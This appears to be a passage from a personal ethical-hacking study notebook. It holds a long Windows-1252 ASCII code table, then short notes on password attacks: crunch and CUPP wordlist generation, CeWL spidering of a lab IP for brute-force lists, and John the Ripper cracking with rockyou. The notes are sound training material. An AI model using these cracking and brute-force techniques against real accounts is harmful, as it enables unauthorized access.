|[78](https://www.ascii-code.com/78 "ASCII Code 78")|116|4E|01001110|N|&#78;||Uppercase N|
|[79](https://www.ascii-code.com/79 "ASCII Code 79")|117|4F|01001111|O|&#79;||Uppercase O|
|[80](https://www.ascii-code.com/80 "ASCII Code 80")|120|50|01010000|P|&#80;||Uppercase P|
|[81](https://www.ascii-code.com/81 "ASCII Code 81")|121|51|01010001|Q|&#81;||Uppercase Q|
|[82](https://www.ascii-code.com/82 "ASCII Code 82")|122|52|01010010|R|&#82;||Uppercase R|
|[83](https://www.ascii-code.com/83 "ASCII Code 83")|123|53|01010011|S|&#83;||Uppercase S|
|[84](https://www.ascii-code.com/84 "ASCII Code 84")|124|54|01010100|T|&#84;||Uppercase T|
|[85](https://www.ascii-code.com/85 "ASCII Code 85")|125|55|01010101|U|&#85;||Uppercase U|
|[86](https://www.ascii-code.com/86 "ASCII Code 86")|126|56|01010110|V|&#86;||Uppercase V|
|[87](https://www.ascii-code.com/87 "ASCII Code 87")|127|57|01010111|W|&#87;||Uppercase W|
|[88](https://www.ascii-code.com/88 "ASCII Code 88")|130|58|01011000|X|&#88;||Uppercase X|
|[89](https://www.ascii-code.com/89 "ASCII Code 89")|131|59|01011001|Y|&#89;||Uppercase Y|
|[90](https://www.ascii-code.com/90 "ASCII Code 90")|132|5A|01011010|Z|&#90;||Uppercase Z|
|[91](https://www.ascii-code.com/91 "ASCII Code 91")|133|5B|01011011|[|&#91;|&lsqb;|Opening bracket|
|[92](https://www.ascii-code.com/92 "ASCII Code 92")|134|5C|01011100|\|&#92;|&bsol;|Backslash|
|[93](https://www.ascii-code.com/93 "ASCII Code 93")|135|5D|01011101|]|&#93;|&rsqb;|Closing bracket|
|[94](https://www.ascii-code.com/94 "ASCII Code 94")|136|5E|01011110|^|&#94;|&Hat;|Caret - circumflex|
|[95](https://www.ascii-code.com/95 "ASCII Code 95")|137|5F|01011111|_|&#95;|&lowbar;|Underscore|
|[96](https://www.ascii-code.com/96 "ASCII Code 96")|140|60|01100000|`|&#96;|&grave;|Grave accent|
|[97](https://www.ascii-code.com/97 "ASCII Code 97")|141|61|01100001|a|&#97;||Lowercase a|
|[98](https://www.ascii-code.com/98 "ASCII Code 98")|142|62|01100010|b|&#98;||Lowercase b|
|[99](https://www.ascii-code.com/99 "ASCII Code 99")|143|63|01100011|c|&#99;||Lowercase c|
|[100](https://www.ascii-code.com/100 "ASCII Code 100")|144|64|01100100|d|&#100;||Lowercase d|
|[101](https://www.ascii-code.com/101 "ASCII Code 101")|145|65|01100101|e|&#101;||Lowercase e|
|[102](https://www.ascii-code.com/102 "ASCII Code 102")|146|66|01100110|f|&#102;||Lowercase f|
|[103](https://www.ascii-code.com/103 "ASCII Code 103")|147|67|01100111|g|&#103;||Lowercase g|
|[104](https://www.ascii-code.com/104 "ASCII Code 104")|150|68|01101000|h|&#104;||Lowercase h|
|[105](https://www.ascii-code.com/105 "ASCII Code 105")|151|69|01101001|i|&#105;||Lowercase i|
|[106](https://www.ascii-code.com/106 "ASCII Code 106")|152|6A|01101010|j|&#106;||Lowercase j|
|[107](https://www.ascii-code.com/107 "ASCII Code 107")|153|6B|01101011|k|&#107;||Lowercase k|
|[108](https://www.ascii-code.com/108 "ASCII Code 108")|154|6C|01101100|l|&#108;||Lowercase l|
|[109](https://www.ascii-code.com/109 "ASCII Code 109")|155|6D|01101101|m|&#109;||Lowercase m|
|[110](https://www.ascii-code.com/110 "ASCII Code 110")|156|6E|01101110|n|&#110;||Lowercase n|
|[111](https://www.ascii-code.com/111 "ASCII Code 111")|157|6F|01101111|o|&#111;||Lowercase o|
|[112](https://www.ascii-code.com/112 "ASCII Code 112")|160|70|01110000|p|&#112;||Lowercase p|
|[113](https://www.ascii-code.com/113 "ASCII Code 113")|161|71|01110001|q|&#113;||Lowercase q|
|[114](https://www.ascii-code.com/114 "ASCII Code 114")|162|72|01110010|r|&#114;||Lowercase r|
|[115](https://www.ascii-code.com/115 "ASCII Code 115")|163|73|01110011|s|&#115;||Lowercase s|
|[116](https://www.ascii-code.com/116 "ASCII Code 116")|164|74|01110100|t|&#116;||Lowercase t|
|[117](https://www.ascii-code.com/117 "ASCII Code 117")|165|75|01110101|u|&#117;||Lowercase u|
|[118](https://www.ascii-code.com/118 "ASCII Code 118")|166|76|01110110|v|&#118;||Lowercase v|
|[119](https://www.ascii-code.com/119 "ASCII Code 119")|167|77|01110111|w|&#119;||Lowercase w|
|[120](https://www.ascii-code.com/120 "ASCII Code 120")|170|78|01111000|x|&#120;||Lowercase x|
|[121](https://www.ascii-code.com/121 "ASCII Code 121")|171|79|01111001|y|&#121;||Lowercase y|
|[122](https://www.ascii-code.com/122 "ASCII Code 122")|172|7A|01111010|z|&#122;||Lowercase z|
|[123](https://www.ascii-code.com/123 "ASCII Code 123")|173|7B|01111011|{|&#123;|&lcub;|Opening brace|
|[124](https://www.ascii-code.com/124 "ASCII Code 124")|174|7C|01111100|\||&#124;|&verbar;|Vertical bar|
|[125](https://www.ascii-code.com/125 "ASCII Code 125")|175|7D|01111101|}|&#125;|&rcub;|Closing brace|
|[126](https://www.ascii-code.com/126 "ASCII Code 126")|176|7E|01111110|~|&#126;|&tilde;|Equivalency sign - tilde|
|[127](https://www.ascii-code.com/127 "ASCII Code 127")|177|7F|01111111|DEL|&#127;||Delete|

## The extended ASCII codes (character code 128-255)

There are several different variations of the 8-bit ASCII table. The table below is according to Windows-1252 (CP-1252) which is a superset of ISO 8859-1, also called ISO Latin-1, in terms of printable characters, but differs from the IANA's ISO-8859-1 by using displayable characters rather than control characters in the 128 to 159 range. Characters that differ from ISO-8859-1 is marked by light blue color.

|DEC|OCT|HEX|BIN|Symbol|HTML Number|HTML Name|Description|
|---|---|---|---|---|---|---|:--|
|[128](https://www.ascii-code.com/CP1252/128 "ASCII Code 128 (Windows-1252)")|200|80|10000000|€|&#8364;|&euro;|Euro sign|
|[129](https://www.ascii-code.com/CP1252/129 "ASCII Code 129 (Windows-1252)")|201|81|10000001||||Unused|
|[130](https://www.ascii-code.com/CP1252/130 "ASCII Code 130 (Windows-1252)")|202|82|10000010|‚|&#130;|&sbquo;|Single low-9 quotation mark|
|[131](https://www.ascii-code.com/CP1252/131 "ASCII Code 131 (Windows-1252)")|203|83|10000011|ƒ|&#131;|&fnof;|Latin small letter f with hook|
|[132](https://www.ascii-code.com/CP1252/132 "ASCII Code 132 (Windows-1252)")|204|84|10000100|„|&#132;|&bdquo;|Double low-9 quotation mark|
|[133](https://www.ascii-code.com/CP1252/133 "ASCII Code 133 (Windows-1252)")|205|85|10000101|…|&#133;|&hellip;|Horizontal ellipsis|
|[134](https://www.ascii-code.com/CP1252/134 "ASCII Code 134 (Windows-1252)")|206|86|10000110|†|&#134;|&dagger;|Dagger|
|[135](https://www.ascii-code.com/CP1252/135 "ASCII Code 135 (Windows-1252)")|207|87|10000111|‡|&#135;|&Dagger;|Double dagger|
|[136](https://www.ascii-code.com/CP1252/136 "ASCII Code 136 (Windows-1252)")|210|88|10001000|ˆ|&#136;|&circ;|Modifier letter circumflex accent|
|[137](https://www.ascii-code.com/CP1252/137 "ASCII Code 137 (Windows-1252)")|211|89|10001001|‰|&#137;|&permil;|Per mille sign|
|[138](https://www.ascii-code.com/CP1252/138 "ASCII Code 138 (Windows-1252)")|212|8A|10001010|Š|&#138;|&Scaron;|Latin capital letter S with caron|
|[139](https://www.ascii-code.com/CP1252/139 "ASCII Code 139 (Windows-1252)")|213|8B|10001011|‹|&#139;|&lsaquo;|Single left-pointing angle quotation|
|[140](https://www.ascii-code.com/CP1252/140 "ASCII Code 140 (Windows-1252)")|214|8C|10001100|Œ|&#140;|&OElig;|Latin capital ligature OE|
|[141](https://www.ascii-code.com/CP1252/141 "ASCII Code 141 (Windows-1252)")|215|8D|10001101||||Unused|
|[142](https://www.ascii-code.com/CP1252/142 "ASCII Code 142 (Windows-1252)")|216|8E|10001110|Ž|&#142;|&Zcaron;|Latin capital letter Z with caron|
|[143](https://www.ascii-code.com/CP1252/143 "ASCII Code 143 (Windows-1252)")|217|8F|10001111||||Unused|
|[144](https://www.ascii-code.com/CP1252/144 "ASCII Code 144 (Windows-1252)")|220|90|10010000||||Unused|
|[145](https://www.ascii-code.com/CP1252/145 "ASCII Code 145 (Windows-1252)")|221|91|10010001|‘|&#145;|&lsquo;|Left single quotation mark|
|[146](https://www.ascii-code.com/CP1252/146 "ASCII Code 146 (Windows-1252)")|222|92|10010010|’|&#146;|&rsquo;|Right single quotation mark|
|[147](https://www.ascii-code.com/CP1252/147 "ASCII Code 147 (Windows-1252)")|223|93|10010011|“|&#147;|&ldquo;|Left double quotation mark|
|[148](https://www.ascii-code.com/CP1252/148 "ASCII Code 148 (Windows-1252)")|224|94|10010100|”|&#148;|&rdquo;|Right double quotation mark|
|[149](https://www.ascii-code.com/CP1252/149 "ASCII Code 149 (Windows-1252)")|225|95|10010101|•|&#149;|&bull;|Bullet|
|[150](https://www.ascii-code.com/CP1252/150 "ASCII Code 150 (Windows-1252)")|226|96|10010110|–|&#150;|&ndash;|En dash|
|[151](https://www.ascii-code.com/CP1252/151 "ASCII Code 151 (Windows-1252)")|227|97|10010111|—|&#151;|&mdash;|Em dash|
|[152](https://www.ascii-code.com/CP1252/152 "ASCII Code 152 (Windows-1252)")|230|98|10011000|˜|&#152;|&tilde;|Small tilde|
|[153](https://www.ascii-code.com/CP1252/153 "ASCII Code 153 (Windows-1252)")|231|99|10011001|™|&#153;|&trade;|Trade mark sign|
|[154](https://www.ascii-code.com/CP1252/154 "ASCII Code 154 (Windows-1252)")|232|9A|10011010|š|&#154;|&scaron;|Latin small letter S with caron|
|[155](https://www.ascii-code.com/CP1252/155 "ASCII Code 155 (Windows-1252)")|233|9B|10011011|›|&#155;|&rsaquo;|Single right-pointing angle quotation mark|
|[156](https://www.ascii-code.com/CP1252/156 "ASCII Code 156 (Windows-1252)")|234|9C|10011100|œ|&#156;|&oelig;|Latin small ligature oe|
|[157](https://www.ascii-code.com/CP1252/157 "ASCII Code 157 (Windows-1252)")|235|9D|10011101||||Unused|
|[158](https://www.ascii-code.com/CP1252/158 "ASCII Code 158 (Windows-1252)")|236|9E|10011110|ž|&#158;|&zcaron;|Latin small letter z with caron|
|[159](https://www.ascii-code.com/CP1252/159 "ASCII Code 159 (Windows-1252)")|237|9F|10011111|Ÿ|&#159;|&Yuml;|Latin capital letter Y with diaeresis|
|[160](https://www.ascii-code.com/CP1252/160 "ASCII Code 160 (Windows-1252)")|240|A0|10100000|NBSP|&#160;|&nbsp;|Non-breaking space|
|[161](https://www.ascii-code.com/CP1252/161 "ASCII Code 161 (Windows-1252)")|241|A1|10100001|¡|&#161;|&iexcl;|Inverted exclamation mark|
|[162](https://www.ascii-code.com/CP1252/162 "ASCII Code 162 (Windows-1252)")|242|A2|10100010|¢|&#162;|&cent;|Cent sign|
|[163](https://www.ascii-code.com/CP1252/163 "ASCII Code 163 (Windows-1252)")|243|A3|10100011|£|&#163;|&pound;|Pound sign|
|[164](https://www.ascii-code.com/CP1252/164 "ASCII Code 164 (Windows-1252)")|244|A4|10100100|¤|&#164;|&curren;|Currency sign|
|[165](https://www.ascii-code.com/CP1252/165 "ASCII Code 165 (Windows-1252)")|245|A5|10100101|¥|&#165;|&yen;|Yen sign|
|[166](https://www.ascii-code.com/CP1252/166 "ASCII Code 166 (Windows-1252)")|246|A6|10100110|¦|&#166;|&brvbar;|Pipe, broken vertical bar|
|[167](https://www.ascii-code.com/CP1252/167 "ASCII Code 167 (Windows-1252)")|247|A7|10100111|§|&#167;|&sect;|Section sign|
|[168](https://www.ascii-code.com/CP1252/168 "ASCII Code 168 (Windows-1252)")|250|A8|10101000|¨|&#168;|&uml;|Spacing diaeresis - umlaut|
|[169](https://www.ascii-code.com/CP1252/169 "ASCII Code 169 (Windows-1252)")|251|A9|10101001|©|&#169;|&copy;|Copyright sign|
|[170](https://www.ascii-code.com/CP1252/170 "ASCII Code 170 (Windows-1252)")|252|AA|10101010|ª|&#170;|&ordf;|Feminine ordinal indicator|
|[171](https://www.ascii-code.com/CP1252/171 "ASCII Code 171 (Windows-1252)")|253|AB|10101011|«|&#171;|&laquo;|Left double angle quotes|
|[172](https://www.ascii-code.com/CP1252/172 "ASCII Code 172 (Windows-1252)")|254|AC|10101100|¬|&#172;|&not;|Negation|
|[173](https://www.ascii-code.com/CP1252/173 "ASCII Code 173 (Windows-1252)")|255|AD|10101101|­SHY|&#173;|&shy;|Soft hyphen|
|[174](https://www.ascii-code.com/CP1252/174 "ASCII Code 174 (Windows-1252)")|256|AE|10101110|®|&#174;|&reg;|Registered trade mark sign|
|[175](https://www.ascii-code.com/CP1252/175 "ASCII Code 175 (Windows-1252)")|257|AF|10101111|¯|&#175;|&macr;|Spacing macron - overline|
|[176](https://www.ascii-code.com/CP1252/176 "ASCII Code 176 (Windows-1252)")|260|B0|10110000|°|&#176;|&deg;|Degree sign|
|[177](https://www.ascii-code.com/CP1252/177 "ASCII Code 177 (Windows-1252)")|261|B1|10110001|±|&#177;|&plusmn;|Plus-or-minus sign|
|[178](https://www.ascii-code.com/CP1252/178 "ASCII Code 178 (Windows-1252)")|262|B2|10110010|²|&#178;|&sup2;|Superscript two - squared|
|[179](https://www.ascii-code.com/CP1252/179 "ASCII Code 179 (Windows-1252)")|263|B3|10110011|³|&#179;|&sup3;|Superscript three - cubed|
|[180](https://www.ascii-code.com/CP1252/180 "ASCII Code 180 (Windows-1252)")|264|B4|10110100|´|&#180;|&acute;|Acute accent - spacing acute|
|[181](https://www.ascii-code.com/CP1252/181 "ASCII Code 181 (Windows-1252)")|265|B5|10110101|µ|&#181;|&micro;|Micro sign|
|[182](https://www.ascii-code.com/CP1252/182 "ASCII Code 182 (Windows-1252)")|266|B6|10110110|¶|&#182;|&para;|Pilcrow sign - paragraph sign|
|[183](https://www.ascii-code.com/CP1252/183 "ASCII Code 183 (Windows-1252)")|267|B7|10110111|·|&#183;|&middot;|Middle dot - Georgian comma|
|[184](https://www.ascii-code.com/CP1252/184 "ASCII Code 184 (Windows-1252)")|270|B8|10111000|¸|&#184;|&cedil;|Spacing cedilla|
|[185](https://www.ascii-code.com/CP1252/185 "ASCII Code 185 (Windows-1252)")|271|B9|10111001|¹|&#185;|&sup1;|Superscript one|
|[186](https://www.ascii-code.com/CP1252/186 "ASCII Code 186 (Windows-1252)")|272|BA|10111010|º|&#186;|&ordm;|Masculine ordinal indicator|
|[187](https://www.ascii-code.com/CP1252/187 "ASCII Code 187 (Windows-1252)")|273|BB|10111011|»|&#187;|&raquo;|Right double angle quotes|
|[188](https://www.ascii-code.com/CP1252/188 "ASCII Code 188 (Windows-1252)")|274|BC|10111100|¼|&#188;|&frac14;|Fraction one quarter|
|[189](https://www.ascii-code.com/CP1252/189 "ASCII Code 189 (Windows-1252)")|275|BD|10111101|½|&#189;|&frac12;|Fraction one half|
|[190](https://www.ascii-code.com/CP1252/190 "ASCII Code 190 (Windows-1252)")|276|BE|10111110|¾|&#190;|&frac34;|Fraction three quarters|
|[191](https://www.ascii-code.com/CP1252/191 "ASCII Code 191 (Windows-1252)")|277|BF|10111111|¿|&#191;|&iquest;|Inverted question mark|
|[192](https://www.ascii-code.com/CP1252/192 "ASCII Code 192 (Windows-1252)")|300|C0|11000000|À|&#192;|&Agrave;|Latin capital letter A with grave|
|[193](https://www.ascii-code.com/CP1252/193 "ASCII Code 193 (Windows-1252)")|301|C1|11000001|Á|&#193;|&Aacute;|Latin capital letter A with acute|
|[194](https://www.ascii-code.com/CP1252/194 "ASCII Code 194 (Windows-1252)")|302|C2|11000010|Â|&#194;|&Acirc;|Latin capital letter A with circumflex|
|[195](https://www.ascii-code.com/CP1252/195 "ASCII Code 195 (Windows-1252)")|303|C3|11000011|Ã|&#195;|&Atilde;|Latin capital letter A with tilde|
|[196](https://www.ascii-code.com/CP1252/196 "ASCII Code 196 (Windows-1252)")|304|C4|11000100|Ä|&#196;|&Auml;|Latin capital letter A with diaeresis|
|[197](https://www.ascii-code.com/CP1252/197 "ASCII Code 197 (Windows-1252)")|305|C5|11000101|Å|&#197;|&Aring;|Latin capital letter A with ring above|
|[198](https://www.ascii-code.com/CP1252/198 "ASCII Code 198 (Windows-1252)")|306|C6|11000110|Æ|&#198;|&AElig;|Latin capital letter AE|
|[199](https://www.ascii-code.com/CP1252/199 "ASCII Code 199 (Windows-1252)")|307|C7|11000111|Ç|&#199;|&Ccedil;|Latin capital letter C with cedilla|
|[200](https://www.ascii-code.com/CP1252/200 "ASCII Code 200 (Windows-1252)")|310|C8|11001000|È|&#200;|&Egrave;|Latin capital letter E with grave|
|[201](https://www.ascii-code.com/CP1252/201 "ASCII Code 201 (Windows-1252)")|311|C9|11001001|É|&#201;|&Eacute;|Latin capital letter E with acute|
|[202](https://www.ascii-code.com/CP1252/202 "ASCII Code 202 (Windows-1252)")|312|CA|11001010|Ê|&#202;|&Ecirc;|Latin capital letter E with circumflex|
|[203](https://www.ascii-code.com/CP1252/203 "ASCII Code 203 (Windows-1252)")|313|CB|11001011|Ë|&#203;|&Euml;|Latin capital letter E with diaeresis|
|[204](https://www.ascii-code.com/CP1252/204 "ASCII Code 204 (Windows-1252)")|314|CC|11001100|Ì|&#204;|&Igrave;|Latin capital letter I with grave|
|[205](https://www.ascii-code.com/CP1252/205 "ASCII Code 205 (Windows-1252)")|315|CD|11001101|Í|&#205;|&Iacute;|Latin capital letter I with acute|
|[206](https://www.ascii-code.com/CP1252/206 "ASCII Code 206 (Windows-1252)")|316|CE|11001110|Î|&#206;|&Icirc;|Latin capital letter I with circumflex|
|[207](https://www.ascii-code.com/CP1252/207 "ASCII Code 207 (Windows-1252)")|317|CF|11001111|Ï|&#207;|&Iuml;|Latin capital letter I with diaeresis|
|[208](https://www.ascii-code.com/CP1252/208 "ASCII Code 208 (Windows-1252)")|320|D0|11010000|Ð|&#208;|&ETH;|Latin capital letter ETH|
|[209](https://www.ascii-code.com/CP1252/209 "ASCII Code 209 (Windows-1252)")|321|D1|11010001|Ñ|&#209;|&Ntilde;|Latin capital letter N with tilde|
|[210](https://www.ascii-code.com/CP1252/210 "ASCII Code 210 (Windows-1252)")|322|D2|11010010|Ò|&#210;|&Ograve;|Latin capital letter O with grave|
|[211](https://www.ascii-code.com/CP1252/211 "ASCII Code 211 (Windows-1252)")|323|D3|11010011|Ó|&#211;|&Oacute;|Latin capital letter O with acute|
|[212](https://www.ascii-code.com/CP1252/212 "ASCII Code 212 (Windows-1252)")|324|D4|11010100|Ô|&#212;|&Ocirc;|Latin capital letter O with circumflex|
|[213](https://www.ascii-code.com/CP1252/213 "ASCII Code 213 (Windows-1252)")|325|D5|11010101|Õ|&#213;|&Otilde;|Latin capital letter O with tilde|
|[214](https://www.ascii-code.com/CP1252/214 "ASCII Code 214 (Windows-1252)")|326|D6|11010110|Ö|&#214;|&Ouml;|Latin capital letter O with diaeresis|
|[215](https://www.ascii-code.com/CP1252/215 "ASCII Code 215 (Windows-1252)")|327|D7|11010111|×|&#215;|&times;|Multiplication sign|
|[216](https://www.ascii-code.com/CP1252/216 "ASCII Code 216 (Windows-1252)")|330|D8|11011000|Ø|&#216;|&Oslash;|Latin capital letter O with slash|
|[217](https://www.ascii-code.com/CP1252/217 "ASCII Code 217 (Windows-1252)")|331|D9|11011001|Ù|&#217;|&Ugrave;|Latin capital letter U with grave|
|[218](https://www.ascii-code.com/CP1252/218 "ASCII Code 218 (Windows-1252)")|332|DA|11011010|Ú|&#218;|&Uacute;|Latin capital letter U with acute|
|[219](https://www.ascii-code.com/CP1252/219 "ASCII Code 219 (Windows-1252)")|333|DB|11011011|Û|&#219;|&Ucirc;|Latin capital letter U with circumflex|
|[220](https://www.ascii-code.com/CP1252/220 "ASCII Code 220 (Windows-1252)")|334|DC|11011100|Ü|&#220;|&Uuml;|Latin capital letter U with diaeresis|
|[221](https://www.ascii-code.com/CP1252/221 "ASCII Code 221 (Windows-1252)")|335|DD|11011101|Ý|&#221;|&Yacute;|Latin capital letter Y with acute|
|[222](https://www.ascii-code.com/CP1252/222 "ASCII Code 222 (Windows-1252)")|336|DE|11011110|Þ|&#222;|&THORN;|Latin capital letter THORN|
|[223](https://www.ascii-code.com/CP1252/223 "ASCII Code 223 (Windows-1252)")|337|DF|11011111|ß|&#223;|&szlig;|Latin small letter sharp s - ess-zed|
|[224](https://www.ascii-code.com/CP1252/224 "ASCII Code 224 (Windows-1252)")|340|E0|11100000|à|&#224;|&agrave;|Latin small letter a with grave|
|[225](https://www.ascii-code.com/CP1252/225 "ASCII Code 225 (Windows-1252)")|341|E1|11100001|á|&#225;|&aacute;|Latin small letter a with acute|
|[226](https://www.ascii-code.com/CP1252/226 "ASCII Code 226 (Windows-1252)")|342|E2|11100010|â|&#226;|&acirc;|Latin small letter a with circumflex|
|[227](https://www.ascii-code.com/CP1252/227 "ASCII Code 227 (Windows-1252)")|343|E3|11100011|ã|&#227;|&atilde;|Latin small letter a with tilde|
|[228](https://www.ascii-code.com/CP1252/228 "ASCII Code 228 (Windows-1252)")|344|E4|11100100|ä|&#228;|&auml;|Latin small letter a with diaeresis|
|[229](https://www.ascii-code.com/CP1252/229 "ASCII Code 229 (Windows-1252)")|345|E5|11100101|å|&#229;|&aring;|Latin small letter a with ring above|
|[230](https://www.ascii-code.com/CP1252/230 "ASCII Code 230 (Windows-1252)")|346|E6|11100110|æ|&#230;|&aelig;|Latin small letter ae|
|[231](https://www.ascii-code.com/CP1252/231 "ASCII Code 231 (Windows-1252)")|347|E7|11100111|ç|&#231;|&ccedil;|Latin small letter c with cedilla|
|[232](https://www.ascii-code.com/CP1252/232 "ASCII Code 232 (Windows-1252)")|350|E8|11101000|è|&#232;|&egrave;|Latin small letter e with grave|
|[233](https://www.ascii-code.com/CP1252/233 "ASCII Code 233 (Windows-1252)")|351|E9|11101001|é|&#233;|&eacute;|Latin small letter e with acute|
|[234](https://www.ascii-code.com/CP1252/234 "ASCII Code 234 (Windows-1252)")|352|EA|11101010|ê|&#234;|&ecirc;|Latin small letter e with circumflex|
|[235](https://www.ascii-code.com/CP1252/235 "ASCII Code 235 (Windows-1252)")|353|EB|11101011|ë|&#235;|&euml;|Latin small letter e with diaeresis|
|[236](https://www.ascii-code.com/CP1252/236 "ASCII Code 236 (Windows-1252)")|354|EC|11101100|ì|&#236;|&igrave;|Latin small letter i with grave|
|[237](https://www.ascii-code.com/CP1252/237 "ASCII Code 237 (Windows-1252)")|355|ED|11101101|í|&#237;|&iacute;|Latin small letter i with acute|
|[238](https://www.ascii-code.com/CP1252/238 "ASCII Code 238 (Windows-1252)")|356|EE|11101110|î|&#238;|&icirc;|Latin small letter i with circumflex|
|[239](https://www.ascii-code.com/CP1252/239 "ASCII Code 239 (Windows-1252)")|357|EF|11101111|ï|&#239;|&iuml;|Latin small letter i with diaeresis|
|[240](https://www.ascii-code.com/CP1252/240 "ASCII Code 240 (Windows-1252)")|360|F0|11110000|ð|&#240;|&eth;|Latin small letter eth|
|[241](https://www.ascii-code.com/CP1252/241 "ASCII Code 241 (Windows-1252)")|361|F1|11110001|ñ|&#241;|&ntilde;|Latin small letter n with tilde|
|[242](https://www.ascii-code.com/CP1252/242 "ASCII Code 242 (Windows-1252)")|362|F2|11110010|ò|&#242;|&ograve;|Latin small letter o with grave|
|[243](https://www.ascii-code.com/CP1252/243 "ASCII Code 243 (Windows-1252)")|363|F3|11110011|ó|&#243;|&oacute;|Latin small letter o with acute|
|[244](https://www.ascii-code.com/CP1252/244 "ASCII Code 244 (Windows-1252)")|364|F4|11110100|ô|&#244;|&ocirc;|Latin small letter o with circumflex|
|[245](https://www.ascii-code.com/CP1252/245 "ASCII Code 245 (Windows-1252)")|365|F5|11110101|õ|&#245;|&otilde;|Latin small letter o with tilde|
|[246](https://www.ascii-code.com/CP1252/246 "ASCII Code 246 (Windows-1252)")|366|F6|11110110|ö|&#246;|&ouml;|Latin small letter o with diaeresis|
|[247](https://www.ascii-code.com/CP1252/247 "ASCII Code 247 (Windows-1252)")|367|F7|11110111|÷|&#247;|&divide;|Division sign|
|[248](https://www.ascii-code.com/CP1252/248 "ASCII Code 248 (Windows-1252)")|370|F8|11111000|ø|&#248;|&oslash;|Latin small letter o with slash|
|[249](https://www.ascii-code.com/CP1252/249 "ASCII Code 249 (Windows-1252)")|371|F9|11111001|ù|&#249;|&ugrave;|Latin small letter u with grave|
|[250](https://www.ascii-code.com/CP1252/250 "ASCII Code 250 (Windows-1252)")|372|FA|11111010|ú|&#250;|&uacute;|Latin small letter u with acute|
|[251](https://www.ascii-code.com/CP1252/251 "ASCII Code 251 (Windows-1252)")|373|FB|11111011|û|&#251;|&ucirc;|Latin small letter u with circumflex|
|[252](https://www.ascii-code.com/CP1252/252 "ASCII Code 252 (Windows-1252)")|374|FC|11111100|ü|&#252;|&uuml;|Latin small letter u with diaeresis|
|[253](https://www.ascii-code.com/CP1252/253 "ASCII Code 253 (Windows-1252)")|375|FD|11111101|ý|&#253;|&yacute;|Latin small letter y with acute|
|[254](https://www.ascii-code.com/CP1252/254 "ASCII Code 254 (Windows-1252)")|376|FE|11111110|þ|&#254;|&thorn;|Latin small letter thorn|
|[255](https://www.ascii-code.com/CP1252/255 "ASCII Code 255 (Windows-1252)")|377|FF|11111111|ÿ|&#255;|&yuml;|Latin small letter y with diaeresis|

</div></div>


</div></div>

## unpatched servers

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Design error

</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">





</div></div>

## Apps errors

## Open ports

## Default passwords


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



![Pasted image 20230830175054.png](/img/user/Hacking%20%C3%89tico%20y%20Pentesting/attachments/Pasted%20image%2020230830175054.png)

</div></div>


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Avoid access controls to access system
- Password cracking, social engineering
# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Create dics

| Option                                       | Description                                                                                                                                                                                                                                                                              |
| -------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `crunch 3 3 0123456789ABCDEF -o 3digits.txt` | `3` the first number is the minimum length of the generated password<br>`3` the second number is the maximum length of the generated password<br>`0123456789ABCDEF` is the character set to use to generate the passwords<br>`-o 3digits.txt` saves the output to the `3digits.txt` file |
| `-f .file_with_chers.txt`                    | Usa a file with chars                                                                                                                                                                                                                                                                    |
| `-o 3digits.txt`                             | Save in a  file                                                                                                                                                                                                                                                                          |
| `@`                                          | Minus                                                                                                                                                                                                                                                                                    |
| `%`                                          | Numeric                                                                                                                                                                                                                                                                                  |
| `,`                                          | Mayos                                                                                                                                                                                                                                                                                    |
| `,iplomado%%%%`                              | Example to search the word with the year                                                                                                                                                                                                                                                 |


</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- CeWL (pronounced "cool") is a custom word list generator tool that spiders websites to create word lists based on the site's content.
- Spidering, in the context of web security and penetration testing, refers to the process of automatically navigating and cataloguing a website's content, often to retrieve the site structure, content, and other relevant details.
- This capability makes CeWL especially valuable to penetration testers aiming to brute-force login pages or uncover hidden directories using organisation-specific terminology.
- Beyond simple wordlist generation, CeWL can also compile a list of email addresses or usernames identified in team members' page links. Such data can then serve as potential usernames in brute-force operations.

generate a basic wordlist from a website
```
cewl webpage
```

Save it in a file
```shell-session
cewl http://10.10.161.126 -w output.txt
```

Features
1. **Target-specific wordlists:** CeWL crafts wordlists specifically from the content of a targeted website. This means that the generated list is inherently tailored to the vocabulary and terminology used on that site. Such custom lists can increase the efficiency of brute-forcing tasks.
2. **Depth of search:** CeWL can spider a website to a specified depth, thereby extracting words from not just one page but also from linked pages up to the set depth.
3. **Customisable outputs:** CeWL provides various options to fine-tune the wordlist, such as setting a minimum word length, removing numbers, and including meta tags. This level of customisation can be advantageous for targeting specific types of credentials or vulnerabilities.
4. **Built-in features:** While its primary purpose is wordlist generation, CeWL includes functionalities such as username enumeration from author meta tags and email extraction.
5. **Efficiency:** Given its customisability, CeWL can often generate shorter but more relevant word lists than generic ones, making password attacks quicker and more precise.
6. **Integration with other tools:** Being command-line based, CeWL can be integrated seamlessly into automated workflows, and its outputs can be directly fed into other cyber security tools.
7. **Actively maintained:** CeWL is actively maintained and updated. This means it stays relevant and compatible with contemporary security needs and challenges.

# tailor the wordlist to your needs
1. **Specify spidering depth:** The `-d` option allows you to set how deep CeWL should spider. For example, to spider two links deep: 
```
cewl http://10.10.161.126 -d 2 -w output1.txt
```
3. **Set minimum and maximum word length:** Use the `-m` and `-x` options respectively. For instance, to get words between 5 and 10 characters: 
```
cewl http://10.10.161.126 -m 5 -x 10 -w output2.txt
```
5. **Handle authentication:** If the target site is behind a login, you can use the `-a` flag for form-based authentication.
6. **Custom extensions:** The `--with-numbers` option will append numbers to words, and using `--extension` allows you to append custom extensions to each word, making it useful for directory or file brute-forcing.
7. **Follow external links:** By default, CeWL doesn't spider external sites, but using the `--offsite` option allows you to do so.

</div></div>

# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



- Common User passwords profiler
- Generate passwords based on information
- https://github.com/Mebus/cupp

| Option               | Description      |
| -------------------- | ---------------- |
| `python3 cupp.py -i` | Interactive mode |


</div></div>


# 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



# John Basic Syntax

```
john [options] [path to file]
```

show password found
```sh
john hash.txt --show
```
# Automatic Cracking

``` 
john --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt
```

# Identifying Hashes

## hash-identifier
- [[Hacking Ético y Pentesting/hash-id.py\|hash-id.py]]
```shell
